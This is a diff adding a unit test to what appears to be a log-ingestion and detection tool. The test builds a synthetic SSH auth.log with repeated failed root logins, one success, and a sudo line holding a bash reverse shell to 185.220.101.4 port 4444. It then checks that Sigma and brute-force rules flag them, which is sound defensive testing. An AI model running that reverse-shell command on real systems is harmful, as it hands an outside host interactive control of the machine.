@@ -205,6 +205,23 @@ class IngestAndSearch(unittest.TestCase):
             self.assertIn("External.edr", json.load(f))
         self.assertIn("this looks like EDR data", self.logs)
 
+    def test_a_pure_log_gets_its_detections_from_the_rules(self):
+        """A plain auth.log: no product verdict anywhere. Sigma (the reverse shell)
+        and the behaviour rules (the brute force) find what is in it."""
+        lines = [f"Oct  1 10:0{5 + i // 8}:{i * 7 % 60:02d} web01 sshd[22]: Failed password for root from "
+                 f"185.220.101.4 port {50000 + i} ssh2" for i in range(14)]
+        lines.append("Oct  1 10:08:30 web01 sshd[23]: Accepted password for root from 185.220.101.4 port 1 ssh2")
+        lines.append("Oct  1 10:09:00 web01 sudo: root : COMMAND=/bin/bash -i >& /dev/tcp/185.220.101.4/4444 0>&1")
+        if not os.path.isdir("/opt/sigma-rules/rules"):
+            self.skipTest("SigmaHQ rules not installed here")
+        s, rows = self._ingest("\n".join(lines))
+        alerts = [r["n"] for r in rows if r["n"].get("severity") in ("medium", "high", "critical")]
+        by = {a["rule"]: a for a in alerts}
+        self.assertIn("Brute force then success (root from 185.220.101.4)", by)
+        self.assertTrue(any("sigma: " in d for a in alerts for d in a.get("detected_by", [])), alerts)
+        self.assertEqual(1, s["behaviour"])
+        self.assertGreaterEqual(s["sigma"]["rows_hit"], 1)
+
     def test_free_text_with_no_model_keeps_indicator_lines(self):
         s, rows = self._ingest(FREE)
         self.assertEqual(("indicators", 2), (s["via"], s["rows"]))
